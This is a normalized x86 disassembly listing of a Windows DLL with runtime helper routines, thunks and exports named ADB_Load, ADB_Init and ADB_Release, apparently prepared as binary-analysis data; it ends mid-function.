sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x48 ]
add ecx [ eax + 0xc ]
add ecx 0xffffffdc
jmp sub_1001cab0
sub_10023a48
sub ecx [ ecx - 0x4 ]
jmp sub_10010b20
sub_10023a50
sub ecx [ ecx - 0x4 ]
jmp sub_10017620
sub_10023a58
sub ecx [ ecx - 0x4 ]
jmp sub_1001d390
sub_10023e74
sub ecx [ ecx - 0x4 ]
sub ecx 0x8
jmp sub_10023fe0
sub_10023e7f
sub ecx [ ecx - 0x4 ]
jmp sub_10023e50
sub_10023e87
sub ecx [ ecx - 0x4 ]
jmp sub_10023b50
sub_10024111
sub ecx [ ecx - 0x4 ]
jmp sub_10023e90
sub_10024119
sub ecx [ ecx - 0x4 ]
jmp sub_10023fe0
sub_100244a0
push ebp
mov ebp esp
mov eax [ ecx ]
push 0x1
push [ ebp + 0x8 ]
call [ eax + 0x4 ]
dec eax
neg eax
sbb eax eax
inc eax
pop ebp
retn 0x4
sub_10024670
mov [ ecx ] r--data
retn
sub_10024e10
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10024ea5
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10026160
cmp [ ecx + 0x3c ] 0x0
mov eax 0x3fe
mov edx 0x7aed7
cmovne eax edx
retn
sub_10026e00
cmp [ ecx + 0x44 ] 0x0
mov eax 0x3fe
mov edx 0x7aed7
cmovne eax edx
retn
sub_10026fd0
mov eax 0x1
retn
sub_10027670
xor eax eax
retn
sub_10027680
xor eax eax
retn 0x4
sub_10027710
mov eax [ ecx - 0x8 ]
retn
sub_10027b93
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10027cd1
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10027d30
mov [ ecx ] r--data
retn
sub_10027d70
mov ecx [ ecx ]
mov eax [ ecx ]
jmp [ eax + 0xc ]
sub_10028a10
push esi
mov esi ecx
call sub_10028a20
mov ecx esi
pop esi
jmp sub_10028ee0
sub_10029770
mov al 0x4
retn
sub_10029780
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov ecx 0x79
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
sub_10029cc0
push ebp
mov ebp esp
mov ecx [ ecx + 0x44 ]
test ecx ecx
jne r-xdata
pop ebp
jmp sub_10028950
xor eax eax
pop ebp
retn 0xc
sub_10029ce0
mov eax 0x8000
retn
sub_10029d70
push esi
mov esi ecx
mov ecx [ esi + 0x44 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov ecx [ esi + 0x44 ]
pop esi
mov eax [ ecx ]
jmp [ eax + 0x10 ]
sub_1002a9b2
push [ ebp - 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1002aab1
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1002abcd
push [ ebp + 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1002ac72
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1002af00
mov [ ecx ] r--data
retn
sub_1002af40
push esi
mov esi ecx
call sub_1002af60
mov ecx [ esi + 0x14 ]
pop esi
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x8 ]
sub_1002b860
mov eax [ ecx + 0x24 ]
test eax eax
jne r-xdata
retn
mov eax [ ecx ]
jmp [ eax + 0xc ]
sub_1002b870
push 0x0
push [ ecx + 0x28 ]
call [ GetFileSize@IAT ]
retn
sub_1002ba70
mov [ ecx ] r--data
retn
sub_1002ba80
retn 0x4
sub_1002be40
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov [ ecx + 0x18 ] eax
mov eax [ edx + 0xc ]
mov [ ecx + 0x1c ] eax
pop ebp
retn 0x4
sub_1002be60
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov [ ecx + 0x28 ] eax
mov eax [ edx + 0xc ]
mov [ ecx + 0x2c ] eax
mov eax [ ecx + 0x4 ]
mov [ ecx + 0xc ] eax
pop ebp
retn 0x4
sub_1002c040
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov [ ecx + 0x10 ] eax
mov eax [ edx + 0xc ]
mov [ ecx + 0x14 ] eax
pop ebp
retn 0x4
sub_1002c100
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
test eax eax
je r-xdata
retn
push eax
call [ FreeLibrary@IAT ]
sub_1002d66d
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1002d776
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1002d790
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x50d
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_1002fbf3
mov ecx [ ebp - 0x14 ]
call sub_100036e0
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1002fd32
mov ecx [ ebp - 0x14 ]
call sub_100036e0
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1002ff9f
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_100300bc
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10030144
push 0x0
push 0x0
call sub_1003e35b
int3
sub_100301c7
push 0x0
push 0x0
call sub_1003e35b
int3
sub_100301e0
mov [ ecx ] r--data
retn
sub_100303d0
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x40 ]
mov ecx [ eax + 0xc ]
mov eax [ ecx ]
jmp [ eax + 0x8 ]
sub_100303e0
push ebp
mov ebp esp
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x40 ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x8 ]
sub_10030400
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x40 ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx ]
jmp [ eax + 0xc ]
sub_10030520
push ebp
mov ebp esp
mov ecx [ ecx - 0x8 ]
lea eax [ ebp - 0xc ]
sub esp 0xc
push [ ebp + 0x8 ]
push eax
call sub_100307f0
mov eax [ eax ]
mov esp ebp
pop ebp
retn 0x4
sub_10030570
push ebp
mov ebp esp
mov ecx [ ecx - 0x8 ]
lea eax [ ebp - 0xc ]
sub esp 0xc
push [ ebp + 0x8 ]
push eax
call sub_100307f0
mov eax [ eax + 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_10030590
push ebp
mov ebp esp
mov ecx [ ecx - 0x8 ]
pop ebp
jmp sub_10030890
sub_100305a0
add ecx 0xfffffff0
je r-xdata
retn
mov eax [ ecx + 0x4 ]
add ecx 0x4
push 0x1
mov eax [ eax + 0x4 ]
add ecx eax
mov eax [ ecx ]
call [ eax + 0x28 ]
sub_100305b8
sub ecx [ ecx - 0x4 ]
jmp sub_100305a0
sub_100305c0
sub ecx [ ecx - 0x4 ]
jmp sub_10030400
sub_10030960
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x28 ]
mov ecx esi
pop esi
jmp sub_10030970
sub_100311e0
mov eax [ ecx ]
call [ eax + 0x14 ]
shr eax 0x1
sub eax 0x47
retn
sub_10033372
push [ ebp - 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10033422
push [ ebp - 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10033545
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1003363d
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_100337e4
push [ ebp + 0x14 ]
call sub_10033a10
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10033b32
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10033e61
push [ ebp + 0x14 ]
call sub_10033a10
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10033fbb
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10034052
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_100341d0
mov eax 0x3fe
retn
sub_100347e8
sub ecx [ ecx - 0x4 ]
jmp sub_10027670
sub_100347f0
sub ecx [ ecx - 0x4 ]
jmp sub_10034600
sub_100347f8
sub ecx [ ecx - 0x4 ]
jmp sub_10034740
sub_10034920
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
movzx eax ax
push eax
lea eax [ ecx + 0x8 ]
push eax
call [ InterlockedExchange@IAT ]
pop ebp
retn 0x4
sub_10034d00
mov al 0x8
retn
sub_10034f19
sub ecx [ ecx - 0x4 ]
sub ecx 0x8
jmp sub_10027670
sub_10034f24
sub ecx [ ecx - 0x4 ]
jmp sub_10034de0
sub_10034f2c
sub ecx [ ecx - 0x4 ]
jmp sub_10034d00
sub_10034f34
sub ecx [ ecx - 0x4 ]
sub ecx 0x8
jmp sub_10034740
sub_10034f40
mov al 0xa
retn
sub_1003544f
mov ecx [ ebp - 0x20 ]
call sub_100036e0
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10035514
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10035550
mov al 0x9
retn
sub_100358c8
sub ecx [ ecx - 0x4 ]
sub ecx 0x2c
jmp sub_10034740
sub_100358d3
sub ecx [ ecx - 0x4 ]
jmp sub_10035700
sub_100358db
sub ecx [ ecx - 0x4 ]
jmp sub_10035550
sub_10035930
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] r--data
mov eax [ ecx - 0x8 ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x8 ]
mov [ edx + ecx - 0xc ] eax
retn
sub_1003594c
sub ecx [ ecx - 0x4 ]
jmp sub_100358f0
sub_10035954
sub ecx [ ecx - 0x4 ]
jmp sub_10027680
sub_10035aa4
sub ecx [ ecx - 0x4 ]
jmp sub_10035a10
sub_10035c4a
sub ecx [ ecx - 0x4 ]
sub ecx 0x8
jmp sub_10027710
sub_10035c55
sub ecx [ ecx - 0x4 ]
jmp sub_10035b80
sub_10035c5d
sub ecx [ ecx - 0x4 ]
sub ecx 0xc
jmp sub_10027680
sub_10035c70
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] r--data
jne r-xdata
xor eax eax
pop ebp
retn 0x4
lea eax [ ecx - 0x18 ]
pop ebp
retn 0x4
sub_10035df7
sub ecx [ ecx - 0x4 ]
sub ecx 0x4
jmp sub_10026fd0
sub_10035e02
sub ecx [ ecx - 0x4 ]
jmp sub_10035d90
sub_10035e0a
sub ecx [ ecx - 0x4 ]
jmp sub_10035c70
sub_10035e12
sub ecx [ ecx - 0x4 ]
sub ecx 0x4
jmp sub_10027710
sub_10035e20
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] r--data
jne r-xdata
xor eax eax
pop ebp
retn 0x4
lea eax [ ecx - 0x18 ]
pop ebp
retn 0x4
sub_10035fea
sub ecx [ ecx - 0x4 ]
jmp sub_10035f20
sub_10035ff2
sub ecx [ ecx - 0x4 ]
jmp sub_10035e20
sub_10036000
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] r--data
jne r-xdata
xor eax eax
pop ebp
retn 0x4
lea eax [ ecx - 0x1c ]
pop ebp
retn 0x4
sub_10036440
mov ecx [ ebp - 0x18 ]
call sub_10036260
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1003674c
sub ecx [ ecx - 0x4 ]
sub ecx 0x14
jmp sub_10027670
sub_10036757
sub ecx [ ecx - 0x4 ]
jmp sub_10036150
sub_1003675f
sub ecx [ ecx - 0x4 ]
jmp sub_10036000
sub_10036767
sub ecx [ ecx - 0x4 ]
sub ecx 0x10
jmp sub_10027710
sub_10036780
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] r--data
jne r-xdata
xor eax eax
pop ebp
retn 0x4
lea eax [ ecx - 0x18 ]
pop ebp
retn 0x4
sub_1003694a
sub ecx [ ecx - 0x4 ]
jmp sub_10036880
sub_10036952
sub ecx [ ecx - 0x4 ]
jmp sub_10036780
sub_100377e1
mov ecx [ ebp - 0x14 ]
call sub_10036260
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10037a02
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10037cd0
mov eax [ ecx + 0x8 ]
retn
ADB_Load
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_10038450
xor eax eax
pop ebp
retn 0x4
ADB_Init
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
call sub_10037fc0
pop ebp
retn 0x10
ADB_Release
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx ]
call [ eax ]
pop ebp
retn 0x10
sub_10038420
cmp [ ecx * 4 + rw-data ] 0x0
push esi
lea esi [ ecx * 4 + rw-data ]
jne r-xdata
mov eax [ esi ]
pop esi
retn
call sub_100382c0
push eax
push esi
call [ InterlockedExchange@IAT ]
sub_10039630
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1003a394
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1003b330
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax 0x1
pop esi
retn
lea eax [ esi + 0x8 ]
push eax
call [ InitializeCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x1
sub_1003b360
lea eax [ ecx + 0x8 ]
push eax
call [ EnterCriticalSection@IAT ]
retn
sub_1003b370
lea eax [ ecx + 0x8 ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_1003b4a0
push 0x1
lea eax [ ecx + 0x4 ]
push eax
call [ InterlockedExchange@IAT ]
retn
sub_1003b4b0
push esi
mov esi ecx
push 0x1
lea eax [ esi + 0xc ]
push eax
call [ InterlockedExchange@IAT ]
push 0xffffffff
push [ esi + 0x10 ]
call [ TerminateThread@IAT ]
pop esi
retn
sub_1003b4d0
mov eax [ ecx + 0x10 ]
test eax eax
je r-xdata
retn
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
sub_1003b4f0
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x4 ]
push 0x1
lea eax [ esi + 0x8 ]
push eax
call [ InterlockedExchange@IAT ]
pop esi
retn
sub_1003b510
xor eax eax
cmp [ ecx + 0x10 ] eax
setne al
retn
sub_1003b520
mov ecx [ ecx + 0x4 ]
xor eax eax
test ecx ecx
setne al
retn
sub_1003b530
mov ecx [ ecx + 0xc ]
xor eax eax
test ecx ecx
setne al
retn
sub_1003b5c5
mov eax 0x1
retn
sub_1003b620
mov [ ecx ] r--data
retn
sub_1003c4cd
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1003e8e2
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003c4e8
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1003e8e2
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003c503
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1003e8e2
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003c51e
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1003e8e2
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003c539
mov [ ecx ] r--data
jmp sub_1003e905
j_sub_1003e905
jmp sub_1003e905
sub_1003c61a
push ebp
mov ebp esp
pop ebp
jmp sub_1003cdeb
sub_1003ccf1
call sub_1003ef33
retn
sub_1003cdaf
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1003ccb3
neg eax
pop ecx
sbb eax eax
neg eax
dec eax
pop ebp
retn
sub_1003cdc4
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x1
push 0x0
call sub_1003f374
pop ecx
pop ecx
jmp sub_1003f393
call eax
j_sub_1003f3e3#2
jmp sub_1003f3e3
j_sub_1003f3e3
jmp j_sub_1003f3e3#2
sub_1003cf80
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003cf0b
add esp 0x14
pop ebp
retn
sub_1003da8f
test esi esi
jne r-xdata
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_10042658
_start
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003db42
add esp 0xc
pop ebp
retn 0xc
call sub_1004304c
sub_1003dc24
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
push ecx
push [ eax ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003dc50
add esp 0x14
retn
sub_1003e7e0
push ecx
mov [ ecx ] r--data
call sub_100444ac
pop ecx
retn
sub_1003e82b
push ebp
mov ebp esp
call sub_1003e842
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_10044fbb
sub_1003e842
mov eax sub_1004451d
mov [ rw-data ] sub_10044e09
mov [ rw-data ] eax
mov [ rw-data ] sub_10044e9a
mov [ rw-data ] sub_10044ef4
mov [ rw-data ] sub_10044f79
mov [ rw-data ] eax
mov [ rw-data ] sub_1004453e
mov [ rw-data ] sub_10044eb2
mov [ rw-data ] sub_10044e1a
mov [ rw-data ] sub_10044f05
retn
sub_1003e8c7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] r--data
mov eax [ eax ]
mov [ ecx + 0x4 ] eax
mov eax ecx
mov [ ecx + 0x8 ] 0x0
pop ebp
retn 0x8
sub_1003e905
mov [ ecx ] r--data
jmp sub_1003e9a6
sub_1003e9a6
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_1003f3e3
pop ecx
sub_1003e9c2
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_1003ecb4
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1003ec80
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_1003edd7
push ebp
mov ebp esp
call sub_10045188
push [ ebp + 0x8 ]
call sub_100451e5
pop ecx
push 0xff
call sub_1003ee86
int3
sub_1003edf3
push 0x1
push 0x0
push 0x0
call sub_1003ef3c
add esp 0xc
retn
sub_1003ee86
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_1003ef3c
add esp 0xc
pop ebp
retn
sub_1003ef2a
push 0x8
call sub_10045009
pop ecx
retn
sub_1003ef33
push 0x8
call sub_10045173
pop ecx
retn
sub_1003f056
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_10045173
pop ecx
sub_1003f1c5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1003f374
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ rw-data ]
not edx
mov ecx [ ebp + 0x8 ]
and edx eax
and ecx [ ebp + 0xc ]
or edx ecx
mov [ rw-data ] edx
pop ebp
retn
sub_1003f3d6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1003f420
sub esp 0xc
fst [ esp ]
call sub_10045db8
call sub_1003f43d
add esp 0xc
retn
sub_1003fb1b
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp [ eax ] 0xc000001d
je r-xdata
xor eax eax
retn
sub_1003fb62
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_1003fbf6
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_1003fcbe
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1003fdf0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10041b48
push 0xc
call sub_10045173
pop ecx
retn
sub_10041b9c
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_10041ef9
pop ecx
mov [ rw-data ] 0x1
sub_10041ef0
push 0xd
call sub_10045173
pop ecx
retn
sub_1004206b
push 0xd
call sub_10045173
pop ecx
retn
sub_1004245d
push 0xd
call sub_10045173
pop ecx
retn
sub_10042469
push 0xc
call sub_10045173
pop ecx
retn
sub_100425d0
push 0xd
call sub_10045173
pop ecx
retn
sub_100425d9
push 0xc
call sub_10045173
pop ecx
retn
sub_10042658
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
jmp sub_1004503d
push eax
call sub_10043199
or [ rw-data ] 0xffffffff
pop ecx
sub_100426be
push 0xc
call sub_10045173
pop ecx
retn
sub_10042a19
call [ GetProcessHeap@IAT ]
xor ecx ecx
mov [ rw-data ] eax
test eax eax
setne cl
mov eax ecx
retn
sub_10042a2e
and [ rw-data ] 0x0
retn
sub_10042ce1
push 0xb
call sub_10045173
pop ecx
retn
DllMain
xor eax eax
inc eax
retn 0xc
sub_1004317b
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
pop ebp
jmp [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10043199
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsFree@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_100431b8
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsGetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_100434f2
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ Sleep@IAT ]
pop ebp
retn
sub_10043500
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop ebp
retn
sub_10043515
push ebp
mov ebp esp
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push [ ebp + 0x8 ]
call [ UnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_100435e0
xor eax eax
inc eax
retn
sub_100435f4
push 0x8
push r--data
call sub_1003f180
call sub_100424a8
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1003f393
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_10043614
xor eax eax
inc eax
retn
sub_10043628
call sub_100424a8
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_100435f4
call eax
sub_1004363b
push sub_100435f4
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_100436ac
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_100436b5
mov esp [ ebp - 0x18 ]
call sub_100435f4
sub_100436d7
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1003e8e2
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100436f2
mov [ ecx ] r--data
jmp sub_1003e905
sub_100437b7
push [ ebp - 0x14 ]
call sub_100439a3
pop ecx
retn
sub_100438e8
push 0x4
mov eax sub_10053824
call sub_1003e3be
call sub_100424a8
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10043628
call sub_100435bc
sub_10043fd7
xor eax eax
inc eax
retn
sub_10043fdb
mov esp [ ebp - 0x18 ]
call sub_100435f4
sub_10044192
xor eax eax
inc eax
retn
sub_10044196
mov esp [ ebp - 0x18 ]
call sub_100435f4
sub_10044275
push [ ebp - 0x14 ]
call sub_100441a6
pop ecx
retn
sub_100442b3
call sub_100424a8
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_100424a8
dec [ eax + 0x90 ]
sub_10044514
push 0xe
call sub_10045173
pop ecx
retn
sub_10044920
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10044a8f
add esp 0x18
pop ebp
retn
sub_10044e09
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10044e1a
pop ecx
pop ecx
pop ebp
retn
sub_10044e9a
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10044eb2
add esp 0x10
pop ebp
retn
sub_10044ef4
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10044f05
pop ecx
pop ecx
pop ebp
retn
sub_10044fe2
push esi
xor esi esi
push [ esi + rw-data ]
call [ EncodePointer@IAT ]
mov [ esi + rw-data ] eax
add esi 0x4
cmp esi 0x28
jb r-xdata
pop esi
retn
sub_10045001
and [ rw-data ] 0x0
retn
sub_10045131
push 0xa
call sub_10045173
pop ecx
retn
sub_10045173
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10045489
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_100454f1
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_100454fe
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_1004569b
test ebx ebx
je r-xdata
retn
push 0x0
call sub_10045173
pop ecx
sub_1004570f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10045926
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_10045850
add esp 0xc
pop ebp
retn 0x4
sub_10045959
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_10047aa5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_1004598b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_10045850
add esp 0xc
pop ebp
retn 0x8
sub_10045cb9
mov [ ebp - 0x90 ] 0x1
or cl cl
retn
sub_10045cc3
or cl cl
je r-xdata
retn
fchs
sub_10045d30
fld st0
frndint
fsubr st1
fxch st1
fchs
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_10045d45
mov edx [ esp + 0x4 ]
and edx 0x300
or edx 0x7f
mov [ esp + 0x6 ] dx
fldcw [ esp + 0x6 ]
retn
sub_10045d5c
test eax 0x80000
je r-xdata
fadd [ r--data ]
mov eax 0x1
retn
mov eax 0x7
retn
sub_10045db8
mov eax [ esp + 0x8 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ esp + 0x8 ]
retn
retn
sub_10045fc3
call sub_10048425
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_1003f3e3
and [ rw-data ] 0x0
pop ecx
retn
call sub_1004871d
sub_10045fea
mov eax rw-data
retn
sub_10046205
push esi
call sub_10048935
pop ecx
retn
sub_10046b64
push edi
call sub_10048935
pop ecx
retn
sub_10046c81
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10046c47
pop ecx
pop ecx
pop ebp
retn
sub_10046c92
mov ecx [ rw-data ]
xor eax eax
or ecx 0x1
cmp [ rw-data ] ecx
sete al
retn
sub_10046dcb
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10046ca7
add esp 0x14
pop ebp
retn
sub_1004776f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_10047970
push ebp
mov ebp esp
